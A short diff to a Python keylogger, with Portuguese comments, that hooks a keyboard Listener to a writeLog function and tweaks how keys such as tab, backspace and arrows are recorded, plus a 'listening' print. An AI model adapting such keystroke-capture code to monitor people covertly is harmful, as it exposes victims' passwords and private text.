@@ -22,13 +22,16 @@ def writeLog(key):
         "Key.esc": "",
         "Key.cmd": "",
         "Key.caps_lock": "",
-        "Key.backspace": " ",
+        "Key.backspace": "", #\b porém não funciona correto
         "Key.shift": "",
         "Key.right":"",
         "Key.left":"",
         "Key.shift":"",
         "Key.ctrl_l":"",
+        "Key.tab":"\t",
         "Key.ctrl_l\x13":"#(ARQUIVO SALVO)#",
+        "Key.down":"",
+        "Key.up":"",
     }
 
     #converter a tecla pressionada para string
@@ -49,4 +52,5 @@ def writeLog(key):
 #abrir o Listener do teclado e escutar o evento on_press
 #quando o evento on_press ocorrer, chamar a função writeLog
 with Listener(on_press=writeLog) as l:
+    print("Esta escutando...\n")
     l.join()
